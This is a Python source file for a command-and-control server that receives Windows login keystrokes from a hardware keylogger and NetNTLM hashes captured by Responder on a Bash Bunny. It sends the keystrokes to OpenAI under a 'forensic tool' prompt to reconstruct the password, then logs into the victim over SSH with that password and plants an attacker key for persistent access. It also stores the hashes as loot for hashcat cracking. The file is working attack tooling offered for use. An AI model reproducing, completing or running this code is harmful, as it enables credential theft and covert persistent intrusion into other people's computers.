#!/usr/bin/env python3
"""
C2 server for a dual-implant attack:
  - KeyCroc  : captures raw keystroke log of Windows login password
  - Bash Bunny: runs Responder to capture NetNTLM hashes passively

Flow:
  1. KeyCroc POSTs raw SAVEKEYS log  → /keylog
  2. C2 sends log to OpenAI, receives the reconstructed plaintext password
  3. C2 SSHes into target and deploys an authorized_key for persistence
  4. C2 returns the cleaned password to KeyCroc in the HTTP response body
     (KeyCroc can use it locally via sshpass if needed)
  5. Bash Bunny POSTs captured Responder hash files → /hashes
  6. Hashes are saved to loot/ for offline cracking with hashcat

Requirements: pip install paramiko openai
Usage:
  export OPENAI_API_KEY=sk-...
  python3 c2_server.py --host 0.0.0.0 --port 8443 \\
                       --username <windows_user> --pubkey ~/.ssh/id_rsa.pub
"""

import argparse
import datetime
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

try:
    import paramiko

    SSH_AVAILABLE = True
except ImportError:
    print(
        "[!] paramiko not installed — SSH persistence disabled. Run: pip install paramiko"
    )
    SSH_AVAILABLE = False

try:
    from openai import OpenAI

    OPENAI_AVAILABLE = bool(os.environ.get("OPENAI_API_KEY"))
    if not OPENAI_AVAILABLE:
        print(
            "[!] OPENAI_API_KEY not set — password parsing will fall back to heuristic"
        )
except ImportError:
    print(
        "[!] openai not installed — falling back to heuristic. Run: pip install openai"
    )
    OPENAI_AVAILABLE = False

LOOT_DIR = "./loot"
ARGS = None  # populated at startup


# ---------------------------------------------------------------------------
# Password extraction
# ---------------------------------------------------------------------------

OPENAI_PROMPT = """\
You are a forensic tool. The input below is the raw output of a hardware keylogger
that captured every keystroke a user typed at a Windows login screen.

Key events are separated by spaces. Special keys appear as tokens like [BACKSPACE],
[SHIFT], [ENTER], [CAPS], [DELETE]. Shifted characters are recorded literally.

Rules:
- Apply [BACKSPACE] by removing the previous character.
- [CAPS] toggles caps lock — track state.
- Stop at the first [ENTER].
- Return ONLY the final reconstructed password string, nothing else.
- If you cannot determine the password confidently, return the string UNKNOWN.

Raw keylog:
"""


def extract_password_openai(raw: bytes) -> str:
    text = raw.decode(errors="replace").strip()
    client = OpenAI()
    response = client.chat.completions.create(
        model="gpt-4o-mini",
        messages=[{"role": "user", "content": OPENAI_PROMPT + text}],
        temperature=0,
        max_tokens=128,
    )
    password = response.choices[0].message.content.strip()
    print(f"[*] OpenAI reconstructed password: {password!r}")
    return password


def extract_password_heuristic(raw: bytes) -> str:
    """Fallback: naive token join, ignores backspace/caps logic."""
    text = raw.decode(errors="replace")
    tokens = text.split()
    password = "".join(t for t in tokens if not (t.startswith("[") and t.endswith("]")))
    return password


def extract_password(raw: bytes) -> str:
    if OPENAI_AVAILABLE:
        try:
            return extract_password_openai(raw)
        except Exception as e:
            print(f"[!] OpenAI call failed ({e}), falling back to heuristic")
    return extract_password_heuristic(raw)


# ---------------------------------------------------------------------------
# SSH persistence
# ---------------------------------------------------------------------------


def deploy_ssh_persistence(
    target_ip: str, username: str, password: str, pubkey_path: str
):
    """SSH into the target and install our public key for passwordless access."""
    if not SSH_AVAILABLE:
        return

    pubkey_path = Path(pubkey_path).expanduser()
    if not pubkey_path.exists():
        print(f"[!] Public key not found at {pubkey_path} — skipping persistence")
        return

    pub_key_line = pubkey_path.read_text().strip()

    commands = [
        'powershell -Command "New-Item -ItemType Directory -Force -Path $env:USERPROFILE\\.ssh"',
        f"powershell -Command \"Add-Content -Path $env:USERPROFILE\\.ssh\\authorized_keys -Value '{pub_key_line}'\"",
        'powershell -Command "icacls $env:USERPROFILE\\.ssh\\authorized_keys /inheritance:r /grant \\"$env:USERNAME:R\\""',
    ]

    print(f"\n[*] Connecting SSH → {target_ip}:22 as '{username}'...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            target_ip, port=22, username=username, password=password, timeout=20
        )
        print(f"[+] SSH established to {target_ip}")

        for cmd in commands:
            _, stdout, stderr = client.exec_command(cmd)
            out = stdout.read().decode(errors="replace").strip()
            err = stderr.read().decode(errors="replace").strip()
            if out:
                print(f"    > {out}")
            if err:
                print(f"    [err] {err}")

        client.close()
        print(f"[+] Persistence deployed. Future access: ssh {username}@{target_ip}")

    except Exception as e:
        print(f"[-] SSH failed: {e}")


# ---------------------------------------------------------------------------
# HTTP request handler
# ---------------------------------------------------------------------------


class C2Handler(BaseHTTPRequestHandler):

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length)
        os.makedirs(LOOT_DIR, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        # ---- KeyCroc keystroke log ----------------------------------------
        if self.path == "/keylog":
            target_ip = self.headers.get("X-Target-IP", "").strip()

            raw_file = os.path.join(LOOT_DIR, f"keylog_raw_{timestamp}.txt")
            with open(raw_file, "wb") as f:
                f.write(data)

            print(f"\n[+] /keylog  from {self.client_address[0]}")
            print(f"    Target IP : {target_ip or 'not provided'}")
            print(f"    Saved raw : {raw_file}")

            # Send to OpenAI for reconstruction
            password = extract_password(data)

            clean_file = os.path.join(LOOT_DIR, f"keylog_clean_{timestamp}.txt")
            with open(clean_file, "w") as f:
                f.write(password)
            print(f"    Clean pass: {password!r}  (saved to {clean_file})")

            # Return cleaned password to KeyCroc in response body
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(password.encode())

            # SSH persistence in background (don't make KeyCroc wait)
            if target_ip and ARGS.username:
                threading.Thread(
                    target=deploy_ssh_persistence,
                    args=(target_ip, ARGS.username, password, ARGS.pubkey),
                    daemon=True,
                ).start()
            else:
                print("    [!] No target IP or --username — skipping SSH persistence")

        # ---- Bash Bunny Responder hash dump ----------------------------------
        elif self.path == "/hashes":
            device_id = self.headers.get("X-Device-ID", "bunny").strip()
            hash_file = os.path.join(
                LOOT_DIR, f"ntlm_hashes_{device_id}_{timestamp}.txt"
            )
            with open(hash_file, "wb") as f:
                f.write(data)

            print(f"\n[+] /hashes from {self.client_address[0]} (device: {device_id})")
            print(f"    Saved {len(data)} bytes → {hash_file}")
            print(f"    Crack with: hashcat -m 5600 {hash_file} wordlist.txt\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # suppress noisy default access log


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument(
        "--username", default="", help="Windows username on target for SSH"
    )
    parser.add_argument(
        "--pubkey", default="~/.ssh/id_rsa.pub", help="Path to your SSH public key"
    )
    ARGS = parser.parse_args()

    print(f"[*] C2 listening on {ARGS.host}:{ARGS.port}")
    print(f"[*] Loot directory : ./{LOOT_DIR}/")
    print(
        f"[*] OpenAI parsing : {'enabled' if OPENAI_AVAILABLE else 'disabled (heuristic fallback)'}"
    )
    if ARGS.username:
        print(f"[*] SSH persistence: enabled as '{ARGS.username}' using {ARGS.pubkey}")
    else:
        print("[!] SSH persistence: disabled (pass --username to enable)")
    print()

    HTTPServer((ARGS.host, ARGS.port), C2Handler).serve_forever()
